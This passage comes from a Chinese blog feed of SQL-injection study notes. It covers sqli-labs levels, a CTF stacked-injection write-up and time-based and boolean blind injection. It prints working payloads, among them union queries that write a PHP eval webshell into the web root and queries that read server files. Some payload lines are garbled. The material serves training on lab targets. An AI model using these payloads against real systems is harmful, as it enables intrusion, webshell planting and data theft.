class="hljs-number">192.168.209.128:88</span>/Less-<span class="hljs-number">32</span>/?id=-<span class="hljs-number">1</span>�&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> -- qwq<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519101246-7n48yti.png" alt="image"></p><p>注入成功！</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>宽字节注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>时间盲注</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>​<code>Timing Attack注入，也就是时间盲注</code>​。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p><p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是时间盲注。</p><p>利用前提：<u><strong>页面上没有显示位</strong></u>​<u>，</u>​<u><strong>也没有输出 SQL 语句执行错误信息</strong></u>​<u>。</u>​<u><strong>正确的 SQL 语句和错误的 SQL 语句返回页面都一样</strong></u>​<u>，</u>​<u><strong>但是加入 sleep(5)条件之后</strong></u>​<u>，</u>​<u><strong>页面的返回速度明显慢了 5 秒</strong></u>​<u>。</u></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//判断是否存在延时注入<br>?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and sleep(5) --+</span><br></code></pre></td></tr></table></figure><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>时间盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GYCTF2020]Blacklist</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/</url>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>堆叠注入 stacked  injection</category>
      
    </categories>
    
    
    <tags>
      
      <tag>[GYCTF2020]Blacklist</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件读写</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><h3 id="1-union-注入读取文件"><a href="#1-union-注入读取文件" class="headerlink" title="1. union 注入读取文件"></a>1. union 注入读取文件</h3><hr><p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p><p>文件写入只能利用 union 注入</p><p>示例：读取系统根目录下的&#x2F;demo.txt 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">//union注入读取 /demo.txt 文件,windows使用-&gt;盘符:/路径<br><br>http://127.0.0.1/sqli/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,load_file(&quot;demo.txt&quot;) -- +</span><br><span class="hljs-string"></span><br><span class="hljs-string">//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="hljs-keyword">select</span> 1,2,load_file(0x2F64656D6F2E747874) -- +<br></code></pre></td></tr></table></figure><p>如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini&#x2F;my.cnf 文件在[mysqld]下面添加如下内容secure_file_priv &#x3D; “”如图：</p><p>登录 mysql 执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt;SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br><br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><p>这里<code>secure_file_priv</code>​的值要为””或者 “&#x2F;“ secure_file_priv 有三个值</p><p>1、限制 mysqld 不允许导入 | 导出</p><p>​<code>mysqld –secure_file_prive=null</code>​</p><p>2、限制 mysqld 的导入 | 导出 只能发生在&#x2F;tmp&#x2F;目录下</p><p>​<code>mysqld –secure_file_priv=/tmp/</code>​</p><p>3、不对 mysqld 的导入 | 导出做限制</p><p>​<code>secure_file_priv=&#39;&#39;</code>​</p><hr><h3 id="2-盲注读取文件"><a href="#2-盲注读取文件" class="headerlink" title="2. 盲注读取文件"></a>2. 盲注读取文件</h3><hr><p>盲注读取的话就是利用hex函数，将读取的字符串转换成 16 进制，再利用ascii函数，转换成 ascii 码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成</p><p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code>​</p><p>我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以<br>http://127.0.0.1/sqli/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,&#x27;</span>&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[aaa]);?&gt;<span class="hljs-string">&#x27; into outfile &#x27;</span>d:/4.php<span class="hljs-string">&#x27; -- +</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 可以将一句话木马转换成16进制的形式</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="hljs-keyword">select</span> 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile <span class="hljs-string">&#x27;d:/4.php&#x27;</span> -- +<br></code></pre></td></tr></table></figure><p>在文件写入读取的时候，遇见以下这种情况。</p><p><img src="/.com//image-20250519092519-0kcit26.png" alt="image"></p><p>多半是因为权限不足，可以使用@@datadir，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如</p><p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;/www/server/mysql/4.php&#39; --</code>​</p><p><img src="/.com//image-20250519092538-50xr08l.png" alt="image"></p><p>注入成功</p><p><strong>权限不足的解决办法-参考</strong>环境： CentOS7.0 64 位 MySQL5.7 问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用&#x27;select into outfile&#x27;备份数据表提示无法写入文件</span><br>mysql&gt; <span class="hljs-keyword">select</span> 1,2,<span class="hljs-string">&#x27;you are very good hacker&#x27;</span> from  into outfile <span class="hljs-string">&#x27;/www/server/mysql/app.txt&#x27;</span>;<br>ERROR 1 (HY000): Can<span class="hljs-string">&#x27;t create/write to file &#x27;</span>/www/server/mysql/app.txt<span class="hljs-string">&#x27; (Errcode: 13)</span><br></code></pre></td></tr></table></figure><p>排查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看mysql的进程用户,为mysql用户</span><br>[root@lfs ~]# ps aux|grep mysqld<br>root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql<br>mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306<br><br><span class="hljs-comment">#查看/www/server/mysql/目录的权限，mysql用户没有写入权限</span><br>[root@lfs ~]# <span class="hljs-built_in">ls</span> -ld /www/server/mysql/<br>drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/<br></code></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将/data/mysql/目录的归属为mysql用户</span><br><span class="hljs-built_in">chown</span> -R mysql.mysql /www/server/mysql/<br><br>[root@lfs ~]# <span class="hljs-built_in">ls</span> -ld /data/mysql/<br>drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/<br></code></pre></td></tr></table></figure><p>验证，写入成功：</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件读写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[强网杯 2019]随便注</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote><p>先判断注入点的传参方式，发现是get传参。</p></blockquote><blockquote><p>判断闭合方式：输入1再输入1’试试，发现是字符型且闭合方式是单引号</p></blockquote><blockquote><p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p></blockquote><blockquote><p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p></blockquote><p><img src="/.com//image-20250418170120-z5w8c3n.png" alt="image">​</p><blockquote><p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p></blockquote><p><img src="/.com//image-20250418170223-5ylj1zk.png" alt="image"></p><blockquote><p>查看表结构：</p><p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p><p>方式二：<code>1&#39;;desc tableName;#</code>​</p><p>注意，如果tableName是纯数字，需要用反引号包裹</p></blockquote><p><img src="/.com//image-20250418170425-ugseo8r.png" alt="image"></p><blockquote><p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p></blockquote><p>‍</p><p>‍</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p><p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p><p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p><p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p></blockquote><p>‍</p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote><p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p></blockquote><p>‍</p><h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote><p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p></blockquote><p>‍</p><p>‍</p><h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p><p>格式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">PREPARE 名称 FROM Sql语句 ? ;<br>SET @x=xx;<br>EXECUTE 名称 USING @x;<br></code></pre></td></tr></table></figure><p>举例：查询ID为1的用户：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">方法一：<br>SElECT * FROM t_user WHERE USER_ID = 1<br><br>方法二：<br>PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;<br>EXECUTE jia;<br><br>方法三：<br>PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;<br>SET @ID = 1;<br>EXECUTE jia USING @ID;<br><br>方法四：<br>SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;<br>PREPARE jia FROM @SQL;<br>EXECUTE jia;<br></code></pre></td></tr></table></figure><h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul><li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li><li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li></ul><h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul><li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">打开表：<br>HANDLER 表名 OPEN ;<br><br>查看数据：<br>HANDLER 表名 READ next;<br><br>关闭表：<br>HANDLER 表名 READ CLOSE;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>堆叠注入 stacked  injection</category>
      
    </categories>
    
    
    <tags>
      
      <tag>[强网杯 2019]随便注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Less-7</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这一次闭合类型试判断为((‘’))</p><p>这一关多了一个小tips告诉我要用到outfile</p><blockquote><p>我们在写入信息的时候希望多余的信息不要，那么我们就将id报错，或者说没有也就是加上负号-</p></blockquote><p>我们可以上传一句话木马，也可以查询版本和数据库</p><p>写入一句话木马用into outfile函数</p><p>‍</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote><p>​<code>http://127.0.0.1/sqli-labs/Less-7/ ?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;a&#39;]);echo &#39;luck&#39;;?&gt;&quot; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&#39; --+</code>​</p></blockquote><p>然后用蚁剑链接即可</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入靶场</category>
      
      <category>sql——labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Less-7</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Less-8</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>·1.<code>http://127.0.0.1/sgli/Less-8/?id=1&#39;</code>​判断此时存在注入漏洞<br>·2.<code>http://127.0.0.1/sgli/Less-8/?id=1&#39; order by 3 --+</code>​当3改为4的时候，you are in…消失，说明存在三列。<br>·3.<code>http://127.0.0.1/sali/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+</code>​猜出来当前第一位是sa<br>·或者是使用：<code>http://127.0.0.1/sqli/Less-8/?id=1&#39; and ascii(substr((select database()),1,1)) &gt; 16 --+</code>​此时是有回显的。<br>4.<code>http://127.0.0.1/sqli/Less-8/?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)）&gt; 17 --+</code>​先通过大于号或者小于号来判断数据库的第一个字母是哪一个，也可以使用<br><a href="http://127.0.0.1/sqli/Less-8/?id=1%27and">http://127.0.0.1/sqli/Less-8/?id=1&#39;and</a> asci(substr(selectschemaname frominformationschema.schemata limit<br>4,1)1,1)）&#x3D;115–+此时可以验证数据库中第五个数据库的第一个字母是s<br>5.<a href="http://127.0.0.1/sqli/Less-8/?id=1%27and">http://127.0.0.1/sqli/Less-8/?id=1&#39;and</a> asci(substr(select tablename frominformation_schema.tableswhere<br>tableschema&#x3D;0x7365637572697479limit3,1)，1,1)）&gt;11–+判断security数据库中的第4个表中的数据的第一位是否<br>大于11,也可以使用<a href="http://127.0.0.1/sqli/Less-8/?id=1%E2%80%99andascisubstr">http://127.0.0.1/sqli/Less-8/?id=1’andascisubstr</a>(selecttablenamefrom<br>informationschema.tableswheretable.schema&#x3D;0x7365637572697479limit3,1),1,1))&#x3D;117–+验证数据库中第4个表<br>中的数据的第一位的第一个字母的asci码是否是117，也就是u</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入靶场</category>
      
      <category>sql——labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Less-8</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql——labs</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/</url>
    
    <content type="html"><![CDATA[<h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p><h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p><h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p><h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p><h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p><blockquote><p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p><p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p><p><strong>3.like函数：</strong> select user() like ‘ro%’; 匹配与regexp相似</p><p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p><p><strong>5.ascii:</strong></p><p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>     python中转换ascii值</p></blockquote><p>‍</p><h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote><p>补充知识点</p><p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p><p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p><p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p><p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p><pre><code class="hljs">文件位置： 是在sql版本下的data文件中</code></pre><p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p><p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p><p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql——labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Less-6（布尔盲注）</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-6%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-6%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-6（布尔盲注）"><a href="#Less-6（布尔盲注）" class="headerlink" title="Less-6（布尔盲注）"></a>Less-6（布尔盲注）</h1><p>因为也是布尔盲注，所以和上一关一样</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入靶场</category>
      
      <category>sql——labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Less-6（布尔盲注）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Less—5(布尔盲注)</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</url>
    
